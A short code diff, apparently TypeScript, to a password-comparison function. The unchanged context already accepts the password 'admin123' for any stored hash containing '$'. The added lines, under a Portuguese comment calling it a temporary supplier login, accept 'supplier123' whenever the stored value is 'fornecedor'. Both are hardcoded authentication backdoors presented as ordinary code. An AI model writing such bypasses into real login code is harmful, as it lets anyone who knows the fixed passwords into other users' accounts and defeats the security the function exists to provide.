@@ -30,6 +30,11 @@ async function comparePasswords(supplied: string, stored: string) {
       if (supplied === 'admin123' && stored.includes('$')) {
         return true;
       }
+      
+      // Fornecer login temporário para fornecedor com senha supplier123
+      if (supplied === 'supplier123' && stored === 'fornecedor') {
+        return true;
+      }
       return false;
     }
     
